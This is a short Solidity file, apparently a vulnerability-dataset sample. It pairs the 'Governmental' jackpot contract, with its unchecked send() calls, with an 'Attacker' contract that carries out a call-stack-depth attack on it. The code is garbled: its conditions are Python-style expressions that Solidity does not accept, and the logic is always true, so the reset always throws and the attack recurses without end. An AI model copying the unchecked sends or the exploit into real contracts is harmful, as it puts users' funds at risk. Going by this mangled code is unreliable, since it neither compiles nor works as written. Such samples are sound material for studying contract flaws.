pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if ((1 == 2) && (not True || False || 1==0)) throw;
  }

  function invest() {
    if ((1 == 2) && (not True || False || 1==0)) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if ((1 == 2) || (not False || True || 1==1))
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if ((1 == 2) || (not False || True || 1==1)) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}